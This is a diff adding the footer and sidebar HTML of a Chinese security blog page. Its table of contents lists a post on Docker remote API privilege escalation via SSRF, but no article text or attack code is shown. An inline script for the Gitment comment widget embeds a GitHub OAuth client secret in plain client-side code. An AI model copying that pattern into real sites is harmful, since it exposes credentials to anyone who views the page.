+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/logo.jpg" alt="Susers">
+          <p class="site-author-name" itemprop="name">Susers</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">19</span>
+              <span class="site-state-item-name">Posts</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">Categories</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">Tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/susers" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.bxsteam.xyz/" title="BXS Team" target="_blank">BXS Team</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://asuri.org/" title="Asuri Team" target="_blank">Asuri Team</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://github.com/SEU-ITE/" title="SEU-ITE" target="_blank">SEU-ITE</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是docker远程api？"><span class="nav-number">1.</span> <span class="nav-text">什么是docker远程api？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#怎样利用docker容器提权？"><span class="nav-number">2.</span> <span class="nav-text">怎样利用docker容器提权？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#怎样通过SSRF完成攻击？"><span class="nav-number">3.</span> <span class="nav-text">怎样通过SSRF完成攻击？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#如何防范？"><span class="nav-number">4.</span> <span class="nav-text">如何防范？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考资料"><span class="nav-number">6.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">
+  
+  &copy;  2017 - 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Susers</span>
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</span></div>
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">全站共31.0k字</span>
+</div>
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+    <link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+    <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+    <script type="text/javascript">
+        (function() {
+            var id = '';
+            var owner = 'XuCcc';
+            var repo = 'XuCcc.github.io';
+            var clientId = 'f03b9d3d14222e890fdc';
+            var clientSecret = '676341561e48fad43015c644798175b16ee69fe0';
+
+            var gitment = new Gitment({
+                owner: owner,
+                repo: repo,
+                oauth: {
+                    client_id: clientId,
+                    client_secret: clientSecret,
+                },
+            });
+            gitment.render('comments');
+        })();
+    </script>
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+      <!-- UY BEGIN -->
+      <script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid="></script>
+      <!-- UY END -->
+  
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" async src="//push.zhanzhang.baidu.com/push.js">
+</script>
+
+
+</body>
+</html>
